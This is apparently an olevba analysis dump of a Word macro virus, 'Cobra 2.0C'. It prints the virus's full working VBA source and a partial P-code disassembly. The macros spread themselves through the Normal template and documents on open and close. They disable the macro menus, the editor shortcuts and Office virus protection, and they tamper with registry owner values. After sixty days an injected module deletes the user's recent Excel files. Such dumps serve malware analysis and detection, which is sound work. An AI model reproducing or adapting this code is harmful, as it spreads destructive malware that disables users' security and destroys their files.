olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Cobra.z
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Cobra.z - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Cobra_20C.bas 
in file: Virus.MSWord.Cobra.z - OLE stream: 'Macros/VBA/Cobra_20C'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'Cobra Version 2.0C
Sub FileExit()
Call CobC
Call CobA
Call CobB
Call CobD
WordBasic.FileExit
End Sub
Sub FileOpen()
Dialogs(wdDialogFileOpen).Show
Call CobC
Call CobA
Call CobB
Call CobD
End Sub
Sub AutoClose()
Call CobC
Call CobA
Call CobB
Call CobD
End Sub
Sub AutoOpen()
Call CobC
Call CobA
Call CobB
Call CobD
End Sub
Sub CobA()
On Error Resume Next
Dim CA, CB, CD, CE, CC
CA = False: CB = False: CD = False: CE = False
For Each CC In NormalTemplate.VBProject.VBComponents
If CC.Name <> "NewCobra" And CC.Name <> "Cobra_20C" _
And CC.Name <> "ThisDocument" Then
Application.OrganizerDelete _
Source:=NormalTemplate.FullName, _
Name:=CC.Name, Object:=wdOrganizerObjectProjectItems
End If
Next
For Each CC In ActiveDocument.VBProject.VBComponents
If CC.Name <> "NewCobra" And CC.Name <> "Cobra_20C" _
And CC.Name <> "ThisDocument" And CC.Name <> _
"Reference to Normal" Then
Application.OrganizerDelete Source:=ActiveDocument.FullName, _
Name:=CC.Name, Object:=wdOrganizerObjectProjectItems
End If
Next
For Each CC In ActiveDocument.VBProject.VBComponents
If CC.Name = "Cobra_20C" Then CA = True
Next
For Each CC In ActiveDocument.VBProject.VBComponents
If CC.Name = "NewCobra" Then CB = True
Next
For Each CC In NormalTemplate.VBProject.VBComponents
If CC.Name = "NewCobra" Then CD = True
Next
For Each CC In NormalTemplate.VBProject.VBComponents
If CC.Name = "Cobra_20C" Then CE = True
Next
If CD = False And CE = False And CA = True Then
Application.OrganizerCopy Source:=ActiveDocument.FullName, _
Destination:=NormalTemplate.FullName, Name:="Cobra_20C", _
Object:=wdOrganizerObjectProjectItems
End If
If CD = False And CE = False And CB = True Then
Application.OrganizerCopy Source:=ActiveDocument.FullName, _
Destination:=NormalTemplate.FullName, Name:="NewCobra", _
Object:=wdOrganizerObjectProjectItems
End If
If CA = True And CB = False Then
Application.OrganizerRename Source:=ActiveDocument.FullName, _
Name:="Cobra_20C", NewName:="NewCobra", _
Object:=wdOrganizerObjectProjectItems
ElseIf CA = False And CB = True Then
Application.OrganizerRename Source:=ActiveDocument.FullName, _
Name:="NewCobra", NewName:="Cobra_20C", _
Object:=wdOrganizerObjectProjectItems
End If
End Sub
Sub CobB()
On Error Resume Next
Dim CA, CB, CD, CE, CC
CA = False: CB = False: CD = False: CE = False
For Each CC In NormalTemplate.VBProject.VBComponents
If CC.Name = "Cobra_20C" Then CA = True
Next
For Each CC In NormalTemplate.VBProject.VBComponents
If CC.Name = "NewCobra" Then CB = True
Next
For Each CC In ActiveDocument.VBProject.VBComponents
If CC.Name = "Cobra_20C" Then CD = True
Next
For Each CC In ActiveDocument.VBProject.VBComponents
If CC.Name = "NewCobra" Then CE = True
Next
If CD = False And CE = False And CA = True Then
Application.OrganizerCopy Source:=NormalTemplate.FullName, _
Destination:=ActiveDocument.FullName, _
Name:="Cobra_20C", Object:=wdOrganizerObjectProjectItems
End If
If CD = False And CE = False And CB = True Then
Application.OrganizerCopy Source:=NormalTemplate.FullName, _
Destination:=ActiveDocument.FullName, _
Name:="NewCobra", Object:=wdOrganizerObjectProjectItems
End If
If CA = True Then
Application.OrganizerRename Source:=NormalTemplate, _
Name:="Cobra_20C", NewName:="NewCobra", _
Object:=wdOrganizerObjectProjectItems
End If
If CB = True Then
Application.OrganizerRename Source:=NormalTemplate, _
Name:="NewCobra", NewName:="Cobra_20C", _
Object:=wdOrganizerObjectProjectItems
End If
End Sub
Sub CobC()
On Error Resume Next
CommandBars("Tools").Controls("Macro").Enabled = False
CommandBars("Tools").Controls("Macro").Visible = False
CommandBars("Tools").Controls("Macro").Delete
CommandBars("View").Controls("Toolbars").Enabled = False
CommandBars("View").Controls("Toolbars").Visible = False
CommandBars("View").Controls("Toolbars").Delete
FindKey(BuildKeyCode(wdKeyF11, wdKeyAlt)).Disable
FindKey(BuildKeyCode(wdKeyF8, wdKeyAlt)).Disable
Options.VirusProtection = False
Options.SaveNormalPrompt = False
End Sub
Sub CobD()
On Error Resume Next
Dim DM, CM, SR
DM = False
For Each CE In ActiveDocument.VBProject.VBComponents
If CE.Name = "MoreInfect" Then
DM = True
End If
Next
If DM = True Then
If ActiveDocument.VBProject.VBComponents("MoreInfect"). _
CodeModule.Lines(1, 1) = "Sub FileNew()" Then
ActiveDocument.VBProject.VBComponents("MoreInfect"). _
CodeModule.ReplaceLine 1, "Sub FileSaveAs()"
ActiveDocument.VBProject.VBComponents("MoreInfect"). _
CodeModule.InsertLines 23, "Dialogs(wdDialogFileSaveAs).Show"
Else
ActiveDocument.VBProject.VBComponents("MoreInfect"). _
CodeModule.ReplaceLine 1, "Sub FileNew()"
End If
End If
If DM = False Then
Set CM = ActiveDocument.VBProject.VBComponents.Add(1)
CM.Name = "MoreInfect"
MoreCode = "Sub FileNew()" + _
Chr(13) + "On Error Resume Next" + _
Chr(13) + "Dialogs(wdDialogFileNew).Show" + _
Chr(13) + "SR = System.PrivateProfileString("""", ""HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\"", ""RegisteredOwner"")" + _
Chr(13) + "If SR <> ""Cobra"" Then" + _
Chr(13) + "System.PrivateProfileString("""", ""HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\"", ""RegisteredOwner"") = ""Cobra""" + _
Chr(13) + "System.PrivateProfileString("""", ""HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\"", ""RegisteredOrganization"") = ""349,PB/ER/DHK-1217/BD""" + _
Chr(13) + "End If" + _
Chr(13) + "ID = System.PrivateProfileString("""", ""HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\"", ""InfectDate"")" + _
Chr(13) + "If Not IsDate(ID) Then" + _
Chr(13) + "System.PrivateProfileString("""", ""HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\"", ""InfectDate"") = Format(Date, ""mm/dd/yyyy"")" + _
Chr(13) + "End If" + _
Chr(13) + "ID = System.PrivateProfileString("""", ""HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\"", ""InfectDate"")" + _
Chr(13) + "DT = Format(Date, ""mm/dd/yyyy"")" + _
Chr(13) + "IF DateValue(DT)-DateValue(ID)>60 Then" + _
Chr(13) + "Dim FL(4)" + _
Chr(13) + "For i = 1 To 4" + _
Chr(13) + "FL(i) = System.PrivateProfileString("""", ""HKEY_CURRENT_USER\Software\Microsoft\Office\8.0\Excel\Recent File List"", ""File"" & Trim(Str(i)))" + _
Chr(13) + "Next" + _
Chr(13) + "For i = 1 To 4" + _
Chr(13) + "If FL(i)<>"""" Then Kill FL(i)" + _
Chr(13) + "Next" + _
Chr(13) + "End If" + _
Chr(13) + "End Sub"
CM.CodeModule.InsertLines 1, MoreCode
End If
ActiveDocument.SaveAs FileName:=ActiveDocument.FullName, _
FileFormat:=wdFormatDocument
End Sub
-------------------------------------------------------------------------------
VBA MACRO MoreInfect.bas 
in file: Virus.MSWord.Cobra.z - OLE stream: 'Macros/VBA/MoreInfect'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub FileNew()
On Error Resume Next
Dialogs(wdDialogFileNew).Show
SR = System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\", "RegisteredOwner")
If SR <> "Cobra" Then
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\", "RegisteredOwner") = "Cobra"
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\", "RegisteredOrganization") = "349,PB/ER/DHK-1217/BD"
End If
ID = System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\", "InfectDate")
If Not IsDate(ID) Then
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\", "InfectDate") = Format(Date, "mm/dd/yyyy")
End If
ID = System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\", "InfectDate")
DT = Format(Date, "mm/dd/yyyy")
If DateValue(DT) - DateValue(ID) > 60 Then
Dim FL(4)
For i = 1 To 4
FL(i) = System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\8.0\Excel\Recent File List", "File" & Trim(Str(i)))
Next
For i = 1 To 4
If FL(i) <> "" Then Kill FL(i)
Next
End If
End Sub
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Cobra.z
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 903 bytes
' Macros/VBA/Cobra_20C - 19061 bytes
' Line #0:
' 	QuoteRem 0x0000 0x0012 "Cobra Version 2.0C"
' Line #1:
' 	FuncDefn (Sub FileExit())
' Line #2:
' 	ArgsCall (Call) CobC 0x0000 
' Line #3:
' 	ArgsCall (Call) CobA 0x0000 
' Line #4:
' 	ArgsCall (Call) CobB 0x0000 
' Line #5:
' 	ArgsCall (Call) CobD 0x0000 
' Line #6:
' 	Ld WordBasic 
' 	ArgsMemCall FileExit 0x0000 
' Line #7:
' 	EndSub 
' Line #8:
' 	FuncDefn (Sub FileOpen())
' Line #9:
' 	Ld wdDialogFileOpen 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #10:
' 	ArgsCall (Call) CobC 0x0000 
' Line #11:
' 	ArgsCall (Call) CobA 0x0000 
' Line #12:
' 	ArgsCall (Call) CobB 0x0000 
' Line #13:
' 	ArgsCall (Call) CobD 0x0000 
' Line #14:
' 	EndSub 
' Line #15:
' 	FuncDefn (Sub AutoClose())
' Line #16:
' 	ArgsCall (Call) CobC 0x0000 
' Line #17:
' 	ArgsCall (Call) CobA 0x0000 
' Line #18:
' 	ArgsCall (Call) CobB 0x0000 
' Line #19:
' 	ArgsCall (Call) CobD 0x0000 
' Line #20:
' 	EndSub 
' Line #21:
' 	FuncDefn (Sub AutoOpen())
' Line #22:
' 	ArgsCall (Call) CobC 0x0000 
' Line #23:
' 	ArgsCall (Call) CobA 0x0000 
' Line #24:
' 	ArgsCall (Call) CobB 0x0000 
' Line #25:
' 	ArgsCall (Call) CobD 0x0000 
' Line #26:
' 	EndSub 
' Line #27:
' 	FuncDefn (Sub CobA())
' Line #28:
' 	OnError (Resume Next) 
' Line #29:
' 	Dim 
' 	VarDefn CA
' 	VarDefn CB
' 	VarDefn CD
' 	VarDefn CE
' 	VarDefn CC
' Line #30:
' 	LitVarSpecial (False)
' 	St CA 
' 	BoS 0x0000 
' 	LitVarSpecial (False)
' 	St CB 
' 	BoS 0x0000 
' 	LitVarSpecial (False)
' 	St CD 
' 	BoS 0x0000 
' 	LitVarSpecial (False)
' 	St CE 
' Line #31:
' 	StartForVariable 
' 	Ld CC 
' 	EndForVariable 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ForEach 
' Line #32:
' 	LineCont 0x0004 0C 00 00 00
' 	Ld CC 
' 	MemLd New 
' 	LitStr 0x0008 "NewCobra"
' 	Ne 
' 	Ld CC 
' 	MemLd New 
' 	LitStr 0x0009 "Cobra_20C"
' 	Ne 
' 	And 
' 	Ld CC 
' 	MemLd New 
' 	LitStr 0x000C "ThisDocument"
' 	Ne 
' 	And 
' 	IfBlock 
' Line #33:
' 	LineCont 0x0008 03 00 00 00 09 00 00 00
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld CC 
' 	MemLd New 
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerDelete 0x0003 
' Line #34:
' 	EndIfBlock 
' Line #35:
' 	StartForVariable 
' 	Next 
' Line #36:
' 	StartForVariable 
' 	Ld CC 
' 	EndForVariable 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ForEach 
' Line #37:
' 	LineCont 0x0008 0C 00 00 00 17 00 00 00
' 	Ld CC 
' 	MemLd New 
' 	LitStr 0x0008 "NewCobra"
' 	Ne 
' 	Ld CC 
' 	MemLd New 
' 	LitStr 0x0009 "Cobra_20C"
' 	Ne 
' 	And 
' 	Ld CC 
' 	MemLd New 
' 	LitStr 0x000C "ThisDocument"
' 	Ne 
' 	And 
' 	Ld CC 
' 	MemLd New 
' 	LitStr 0x0013 "Reference to Normal"
' 	Ne 
' 	And 
' 	IfBlock 
' Line #38:
' 	LineCont 0x0004 09 00 00 00
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld CC 
' 	MemLd New 
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerDelete 0x0003 
' Line #39:
' 	EndIfBlock 
' Line #40:
' 	StartForVariable 
' 	Next 
' Line #41:
' 	StartForVariable 
' 	Ld CC 
' 	EndForVariable 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ForEach 
' Line #42:
' 	Ld CC 
' 	MemLd New 
' 	LitStr 0x0009 "Cobra_20C"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St CA 
' 	EndIf 
' Line #43:
' 	StartForVariable 
' 	Next 
' Line #44:
' 	StartForVariable 
' 	Ld CC 
' 	EndForVariable 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ForEach 
' Line #45:
' 	Ld CC 
' 	MemLd New 
' 	LitStr 0x0008 "NewCobra"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St CB 
' 	EndIf 
' Line #46:
' 	StartForVariable 
' 	Next 
' Line #47:
' 	StartForVariable 
' 	Ld CC 
' 	EndForVariable 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ForEach 
' Line #48:
' 	Ld CC 
' 	MemLd New 
' 	LitStr 0x0008 "NewCobra"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St CD 
' 	EndIf 
' Line #49:
' 	StartForVariable 
' 	Next 
' Line #50:
' 	StartForVariable 
' 	Ld CC 
' 	EndForVariable 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ForEach 
' Line #51:
' 	Ld CC 
' 	MemLd New 
' 	LitStr 0x0009 "Cobra_20C"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St CE 
' 	EndIf 
' Line #52:
' 	StartForVariable 
' 	Next 
' Line #53:
' 	Ld CD 
' 	LitVarSpecial (False)
' 	Eq 
' 	Ld CE 
' 	LitVarSpecial (False)
' 	Eq 
' 	And 
' 	Ld CA 
' 	LitVarSpecial (True)
' 	Eq 
' 	And 
' 	IfBlock 
' Line #54:
' 	LineCont 0x0008 09 00 00 00 13 00 00 00
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x0009 "Cobra_20C"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #55:
' 	EndIfBlock 
' Line #56:
' 	Ld CD 
' 	LitVarSpecial (False)
' 	Eq 
' 	Ld CE 
' 	LitVarSpecial (False)
' 	Eq 
' 	And 
' 	Ld CB 
' 	LitVarSpecial (True)
' 	Eq 
' 	And 
' 	IfBlock 
' Line #57:
' 	LineCont 0x0008 09 00 00 00 13 00 00 00
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x0008 "NewCobra"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #58:
' 	EndIfBlock 
' Line #59:
' 	Ld CA 
' 	LitVarSpecial (True)
' 	Eq 
' 	Ld CB 
' 	LitVarSpecial (False)
' 	Eq 
' 	And 
' 	IfBlock 
' Line #60:
' 	LineCont 0x0008 09 00 00 00 11 00 00 00
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	LitStr 0x0009 "Cobra_20C"
' 	ParamNamed New 
' 	LitStr 0x0008 "NewCobra"
' 	ParamNamed NewName 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerRename 0x0004 
' Line #61:
' 	Ld CA 
' 	LitVarSpecial (False)
' 	Eq 
' 	Ld CB 
' 	LitVarSpecial (True)
' 	Eq 
' 	And 
' 	ElseIfBlock 
' Line #62:
' 	LineCont 0x0008 09 00 00 00 11 00 00 00
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	LitStr 0x0008 "NewCobra"
' 	ParamNamed New 
' 	LitStr 0x0009 "Cobra_20C"
' 	ParamNamed NewName 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerRename 0x0004 
' Line #63:
' 	EndIfBlock 
' Line #64:
' 	EndSub 
' Line #65:
' 	FuncDefn (Sub CobB())
' Line #66:
' 	OnError (Resume Next) 
' Line #67:
' 	Dim 
' 	VarDefn CA
' 	VarDefn CB
' 	VarDefn CD
' 	VarDefn CE
' 	VarDefn CC
' Line #68:
' 	LitVarSpecial (False)
' 	St CA 
' 	BoS 0x0000 
' 	LitVarSpecial (False)
' 	St CB 
' 	BoS 0x0000 
' 	LitVarSpecial (False)
' 	St CD 
' 	BoS 0x0000 
' 	LitVarSpecial (False)
' 	St CE 
' Line #69:
' 	StartForVariable 
' 	Ld CC 
' 	EndForVariable 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ForEach 
' Line #70:
' 	Ld CC 
' 	MemLd New 
' 	LitStr 0x0009 "Cobra_20C"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St CA 
' 	EndIf 
' Line #71:
' 	StartForVariable 
' 	Next 
' Line #72:
' 	StartForVariable 
' 	Ld CC 
' 	EndForVariable 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ForEach 
' Line #73:
' 	Ld CC 
' 	MemLd New 
' 	LitStr 0x0008 "NewCobra"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St CB 
' 	EndIf 
' Line #74:
' 	StartForVariable 
' 	Next 
' Line #75:
' 	StartForVariable 
' 	Ld CC 
' 	EndForVariable 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ForEach 
' Line #76:
' 	Ld CC 
' 	MemLd New 
' 	LitStr 0x0009 "Cobra_20C"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St CD 
' 	EndIf 
' Line #77:
' 	StartForVariable 
' 	Next 
' Line #78:
' 	StartForVariable 
' 	Ld CC 
' 	EndForVariable 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ForEach 
' Line #79:
' 	Ld CC 
' 	MemLd New 
' 	LitStr 0x0008 "NewCobra"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St CE 
' 	EndIf 
' Line #80:
' 	StartForVariable 
' 	Next 
' Line #81:
' 	Ld CD 
' 	LitVarSpecial (False)
' 	Eq 
' 	Ld CE 
' 	LitVarSpecial (False)
' 	Eq 
' 	And 
' 	Ld CA 
' 	LitVarSpecial (True)
' 	Eq 
' 	And 
' 	IfBlock 
' Line #82:
' 	LineCont 0x0008 09 00 00 00 0F 00 00 00
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x0009 "Cobra_20C"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #83:
' 	EndIfBlock 
' Line #84:
' 	Ld CD 
' 	LitVarSpecial (False)
' 	Eq 
' 	Ld CE 
' 	LitVarSpecial (False)
' 	Eq 
' 	And 
' 	Ld CB 
' 	LitVarSpecial (True)
' 	Eq 
' 	And 
' 	IfBlock 
' Line #85:
' 	LineCont 0x0008 09 00 00 00 0F 00 00 00
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x0008 "NewCobra"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #86:
' 	EndIfBlock 
' Line #87:
' 	Ld CA 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #88:
' 	LineCont 0x0008 07 00 00 00 0F 00 00 00
' 	Ld NormalTemplate 
' 	ParamNamed Source 
' 	LitStr 0x0009 "Cobra_20C"
' 	ParamNamed New 
' 	LitStr 0x0008 "NewCobra"
' 	ParamNamed NewName 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerRename 0x0004 
' Line #89:
' 	EndIfBlock 
' Line #90:
' 	Ld CB 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #91:
' 	LineCont 0x0008 07 00 00 00 0F 00 00 00
' 	Ld NormalTemplate 
' 	ParamNamed Source 
' 	LitStr 0x0008 "NewCobra"
' 	ParamNamed New 
' 	LitStr 0x0009 "Cobra_20C"
' 	ParamNamed NewName 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerRename 0x0004 
' Line #92:
' 	EndIfBlock 
' Line #93:
' 	EndSub 
' Line #94:
' 	FuncDefn (Sub CobC())
' Line #95:
' 	OnError (Resume Next) 
' Line #96:
' 	LitVarSpecial (False)
' 	LitStr 0x0005 "Macro"
' 	LitStr 0x0005 "Tools"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemSt Enabled 
' Line #97:
' 	LitVarSpecial (False)
' 	LitStr 0x0005 "Macro"
' 	LitStr 0x0005 "Tools"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemSt Visible 
' Line #98:
' 	LitStr 0x0005 "Macro"
' 	LitStr 0x0005 "Tools"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	ArgsMemCall Delete 0x0000 
' Line #99:
' 	LitVarSpecial (False)
' 	LitStr 0x0008 "Toolbars"
' 	LitStr 0x0004 "View"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemSt Enabled 
' Line #100:
' 	LitVarSpecial (False)
' 	LitStr 0x0008 "Toolbars"
' 	LitStr 0x0004 "View"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemSt Visible 
' Line #101:
' 	LitStr 0x0008 "Toolbars"
' 	LitStr 0x0004 "View"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	ArgsMemCall Delete 0x0000 
' Line #102:
' 	Ld wdKeyF11 
' 	Ld wdKeyAlt 
' 	ArgsLd BuildKeyCode 0x0002 
' 	ArgsLd FindKey 0x0001 
' 	ArgsMemCall Disable 0x0000 
' Line #103:
' 	Ld wdKeyF8 
' 	Ld wdKeyAlt 
' 	ArgsLd BuildKeyCode 0x0002 
' 	ArgsLd FindKey 0x0001 
' 	ArgsMemCall Disable 0x0000 
' Line #104:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #105:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #106:
' 	EndSub 
' Line #107:
' 	FuncDefn (Sub CobD())
' Line #108:
' 	OnError (Resume Next) 
' Line #109:
' 	Dim 
' 	VarDefn DM
' 	VarDefn CM
' 	VarDefn SR
' Line #110:
' 	LitVarSpecial (False)
' 	St DM 
' Line #111:
' 	StartForVariable 
' 	Ld CE 
' 	EndForVariable 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ForEach 
' Line #112:
' 	Ld CE 
' 	MemLd New 
' 	LitStr 0x000A "MoreInfect"
' 	Eq 
' 	IfBlock 
' Line #113:
' 	LitVarSpecial (True)
' 	St DM 
' Line #114:
' 	EndIfBlock 
' Line #115:
' 	StartForVariable 
' 	Next 
' Line #116:
' 	Ld DM 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #117:
' 	LineCont 0x0004 0A 00 00 00
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	LitStr 0x000A "MoreInfect"
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x000D "Sub FileNew()"
' 	Eq 
' 	IfBlock 
' Line #118:
' 	LineCont 0x0004 09 00 00 00
' 	LitDI2 0x0001 
' 	LitStr 0x0010 "Sub FileSaveAs()"
' 	LitStr 0x000A "MoreInfect"
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall ReplaceLine 0x0002 
' Line #119:
' 	LineCont 0x0004 09 00 00 00
' 	LitDI2 0x0017 
' 	LitStr 0x0020 "Dialogs(wdDialogFileSaveAs).Show"
' 	LitStr 0x000A "MoreInfect"
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #120:
' 	ElseBlock 
' Line #121:
' 	LineCont 0x0004 09 00 00 00
' 	LitDI2 0x0001 
' 	LitStr 0x000D "Sub FileNew()"
' 	LitStr 0x000A "MoreInfect"
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall ReplaceLine 0x0002 
' Line #122:
' 	EndIfBlock 
' Line #123:
' 	EndIfBlock 
' Line #124:
' 	Ld DM 
' 	LitVarSpecial (False)
' 	Eq 
' 	IfBlock 
' Line #125:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Add 0x0001 
' 	Set CM 
' Line #126:
' 	LitStr 0x000A "MoreInfect"
' 	Ld CM 
' 	MemSt New 
' Line #127:
' 	LineCont 0x005C 04 00 00 00 0B 00 00 00 12 00 00 00 19 00 00 00 20 00 00 00 27 00 00 00 2E 00 00 00 35 00 00 00 3C 00 00 00 43 00 00 00 4A 00 00 00 51 00 00 00 58 00 00 00 5F 00 00 00 66 00 00 00 6D 00 00 00 74 00 00 00 7B 00 00 00 82 00 00 00 89 00 00 00 90 00 00 00 97 00 00 00 9E 00 00 00
' 	LitStr 0x000D "Sub FileNew()"
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0014 "On Error Resume Next"
' 	Add 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x001D "Dialogs(wdDialogFileNew).Show"
' 	Add 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0078 "SR = System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\", "RegisteredOwner")"
' 	Add 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0015 "If SR <> "Cobra" Then"
' 	Add 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x007D "System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\", "RegisteredOwner") = "Cobra""
' 	Add 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0094 "System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\", "RegisteredOrganization") = "349,PB/ER/DHK-1217/BD""
' 	Add 
' 	LitDI2 0x000D 
